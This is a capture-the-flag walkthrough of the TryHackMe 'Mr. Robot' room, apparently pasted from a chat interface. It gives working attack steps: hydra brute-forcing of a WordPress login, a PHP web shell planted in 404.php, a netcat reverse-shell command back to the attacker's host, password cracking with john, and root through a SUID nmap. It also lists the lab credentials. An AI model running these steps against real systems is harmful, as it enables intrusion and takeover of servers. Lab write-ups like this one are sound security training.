# 🤖 TryHackMe: Mr. Robot

> Difficulty: Medium  
> IP: `10.10.X.X` (use the one from THM)  
> Tags: `Web`, `Enumeration`, `WordPress`, `Privilege Escalation`

---

## 🧭 1. Recon

### 🔍 Nmap Scan

```bash
nmap -sC -sV -oN mrrobot.nmap 10.10.X.X
pgsql
Copy
Edit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1
80/tcp open  http    Apache httpd
Apache is running on port 80. Let's explore it in a browser.

🌐 2. Web Enumeration
Homepage reveals a Mr. Robot-style website.

📄 Check for robots.txt
bash
Copy
Edit
curl http://10.10.X.X/robots.txt
makefile
Copy
Edit
User-agent: *
fsocity.dic
key-1-of-3.txt
fsocity.dic: A wordlist

key-1-of-3.txt: First flag!

bash
Copy
Edit
curl http://10.10.X.X/key-1-of-3.txt
✅ Found first flag!

🧰 3. Directory Brute Forcing
Use gobuster with the discovered wordlist:

bash
Copy
Edit
gobuster dir -u http://10.10.X.X -w fsocity.dic -t 50
Found /wp-login.php → WordPress login

🔑 4. WordPress Login Bruteforce
Use hydra or wpscan:

bash
Copy
Edit
hydra -l elliot -P fsocity.dic 10.10.X.X http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid"
✅ Got credentials:

Username: elliot

Password: ER28-0652

Login to http://10.10.X.X/wp-login.php.

🐚 5. Getting a Shell
Inside WordPress → Appearance → Editor → modify 404.php to include a PHP reverse shell.

php
Copy
Edit
<?php system($_GET['cmd']); ?>
Now trigger the shell:

bash
Copy
Edit
curl "http://10.10.X.X/wp-content/themes/twentyfifteen/404.php?cmd=nc -e /bin/bash YOUR-IP 4444"
Start listener:

bash
Copy
Edit
nc -lvnp 4444
✅ Shell obtained as daemon user.

⬆️ 6. Privilege Escalation
📁 Check for second flag
bash
Copy
Edit
find / -name "key-2-of-3.txt" 2>/dev/null
Found inside robot user’s home, but protected.

bash
Copy
Edit
su robot
Try password reuse from WordPress or bruteforce:

bash
Copy
Edit
john --wordlist=fsocity.dic password.raw
✅ Cracked password → abcdefghijklmnopqrstuvwxyz

bash
Copy
Edit
su robot
✔️ Access granted
✔️ Second flag obtained

🏁 7. Root Access
bash
Copy
Edit
find / -perm -4000 2>/dev/null
Found nmap SUID.

Run interactive shell via:

bash
Copy
Edit
nmap --interactive
> !sh
✅ Got root shell
✅ Found key-3-of-3.txt

🧠 Lessons Learned
Always check robots.txt and use discovered wordlists

WordPress login brute force with username guessing

Reverse shell via 404.php injection

Privilege escalation using nmap SUID trick

🏆 Flags
key-1-of-3: ✅

key-2-of-3: ✅

key-3-of-3: ✅
